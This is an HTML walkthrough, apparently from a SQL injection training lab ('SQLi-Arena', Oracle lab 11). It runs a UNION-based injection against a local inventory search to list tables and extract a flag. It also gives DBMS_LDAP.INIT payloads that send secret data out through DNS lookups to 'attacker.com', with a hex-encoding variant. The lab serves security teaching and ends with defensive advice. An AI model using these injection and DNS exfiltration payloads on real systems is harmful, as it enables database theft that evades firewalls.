<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab11" \<br> --data-urlencode "location=' OR 1=1 -- "<br><br>
        <span class="prompt">Input: </span>' OR 1=1 -- <br>
        <span class="prompt">SQL: </span>SELECT id, item, quantity, location FROM inventory WHERE location = '' OR 1=1 -- '<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 1 | <strong>Item:</strong> Server Rack A1 | <strong>Quantity:</strong> 5 | <strong>Location:</strong> DC-East<br>
        <strong>ID:</strong> 2 | <strong>Item:</strong> Switch 48-Port | <strong>Quantity:</strong> 12 | <strong>Location:</strong> DC-West<br>
        <strong>ID:</strong> 3 | <strong>Item:</strong> UPS 3000VA | <strong>Quantity:</strong> 3 | <strong>Location:</strong> DC-East
    </div>
</div>

<h4>Step 2: Enumerate Tables and Extract Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Table Discovery and Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "location=XXXXNOMATCH' UNION SELECT 0, table_name, 0, 'x' FROM user_tables -- "<br>
        <span class="prompt">Output: </span>INVENTORY, <strong>LDAP_SECRETS</strong><br><br>
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "location=XXXXNOMATCH' UNION SELECT 0, column_name, 0, data_type FROM all_tab_columns WHERE table_name='LDAP_SECRETS' -- "<br>
        <span class="prompt">Output: </span>ID (NUMBER), SECRET (VARCHAR2)<br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab11" \<br> --data-urlencode "location=XXXXNOMATCH' UNION SELECT id, secret, 0, 'x' FROM ldap_secrets -- "<br>
        <span class="prompt">Output: </span><strong>Item:</strong> <strong>FLAG{or_dbms_ld4p_00b}</strong>
    </div>
</div>

<h4>Step 3: DBMS_LDAP.INIT OOB Technique (Conceptual)</h4>
<p>
    <code>DBMS_LDAP.INIT(hostname, port)</code> initializes an LDAP session. By embedding data
    as a subdomain, DNS resolution leaks it to the attacker's authoritative DNS server.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. DBMS_LDAP OOB</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Payload: </span>' UNION SELECT DBMS_LDAP.INIT((SELECT secret FROM ldap_secrets<br>
        &nbsp;&nbsp;WHERE ROWNUM&lt;=1) || '.attacker.com', 389), NULL, NULL, NULL FROM DUAL -- <br><br>
        <span class="prompt">Flow:</span><br>
        1. Oracle evaluates subquery -> FLAG{or_dbms_ld4p_00b}<br>
        2. Calls DBMS_LDAP.INIT('FLAG{or_dbms_ld4p_00b}.attacker.com', 389)<br>
        3. DNS lookup for: FLAG{or_dbms_ld4p_00b}.attacker.com<br>
        4. Attacker's DNS server logs the subdomain!
    </div>
</div>

<h4>Step 4: DNS Exfiltration Details</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Why DNS OOB Works</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">1. </span>DNS (port 53 UDP) is rarely blocked by firewalls<br>
        <span class="prompt">2. </span>Works even when HTTP outbound is blocked<br>
        <span class="prompt">3. </span>DBMS_LDAP may be granted when UTL_HTTP is not<br>
        <span class="prompt">4. </span>DNS queries are often unmonitored<br><br>
        <span class="prompt">Encoding: </span>DNS labels can't contain { } -- use RAWTOHEX():<br>
        <span class="prompt">Payload:  </span>DBMS_LDAP.INIT(RAWTOHEX(UTL_RAW.CAST_TO_RAW(data)) || '.attacker.com', 389)<br>
        <span class="prompt">DNS:      </span>464C41477B6F725F...(hex).attacker.com<br><br>
        <span class="prompt">Tools: </span>interactsh-client | Burp Collaborator | custom DNS server
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{or_dbms_ld4p_00b}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab11" \<br> --data-urlencode "location=XXXXNOMATCH' UNION SELECT id, secret, 0, 'x' FROM ldap_secrets -- "<br><br>
        <span class="prompt">// Verified output:</span><br>
        <strong>Item:</strong> FLAG{or_dbms_ld4p_00b}
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>DBMS_LDAP.INIT()</code> enables DNS-based OOB exfiltration.
    Data embedded as a subdomain in the LDAP hostname is sent via DNS resolution to the attacker's
    DNS server. This is often more reliable than HTTP-based OOB because DNS traffic (port 53 UDP) is
    rarely blocked. Defense: restrict outbound DNS, revoke <code>DBMS_LDAP</code> privileges, monitor
    anomalous DNS queries, and use bind variables.
</div>
